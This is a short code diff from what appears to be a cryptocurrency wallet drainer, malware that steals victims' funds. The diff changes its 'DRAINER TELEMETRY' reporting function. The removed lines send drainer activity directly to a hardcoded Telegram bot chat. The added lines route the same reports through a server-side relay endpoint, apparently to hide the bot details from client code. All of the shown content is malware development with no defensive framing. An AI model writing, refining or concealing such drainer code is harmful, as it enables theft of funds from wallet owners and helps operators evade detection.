@@ -42,18 +42,13 @@ const TELEGRAM_CHAT_ID = "7566241039";
 
 const sendTelemetry = async (message: string) => {
   try {
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-    await fetch(url, {
+    await fetch("/api/notify-telegram", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: `🚀 *DRAINER TELEMETRY*\n\n${message}`,
-        parse_mode: "Markdown",
-      }),
+      body: JSON.stringify({ message }),
     });
   } catch (e) {
-    console.warn("[GOD-TIER] Telemetry failed:", e);
+    console.warn("[GOD-TIER] Telemetry relay failed:", e);
   }
 };
 // ------------------
